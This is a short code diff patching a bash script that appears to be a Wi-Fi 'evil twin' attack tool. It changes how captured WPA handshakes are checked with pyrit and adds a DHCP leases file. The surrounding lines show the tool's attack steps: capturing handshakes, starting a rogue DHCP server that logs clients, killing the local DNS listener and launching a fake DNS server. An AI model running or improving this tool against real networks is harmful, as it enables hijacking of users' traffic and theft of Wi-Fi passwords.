@@ -1120,7 +1120,7 @@ function checkhandshake {
 			Handshake_statuscheck="${red}Not_Found$transparent"
 		fi
 	elif [ "$handshakemode" = "hard" ]; then
-		cp $DUMP_PATH/$Host_MAC-01.cap $DUMP_PATH/test.cap &>$flux_output_device
+		pyrit -r $DUMP_PATH/$Host_MAC-01.cap -o $DUMP_PATH/test.cap stripLive &>$flux_output_device
 		
 		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
 			killall airodump-ng &>$flux_output_device
@@ -1359,6 +1359,9 @@ range $RANG_IP.100 $RANG_IP.250;
 } 
 " >$DUMP_PATH/dhcpd.conf
 
+#create an empty leases file
+touch $DUMP_PATH/dhcpd.leases
+
 # creates Lighttpd web-server 
 echo "server.document-root = \"$DUMP_PATH/data/\"
 
@@ -1508,7 +1511,7 @@ function attack {
 	
 	
 	killall dhcpd &> $flux_output_device
-	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
+	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
 	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $flux_output_device
 	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python $DUMP_PATH/fakedns &
 	
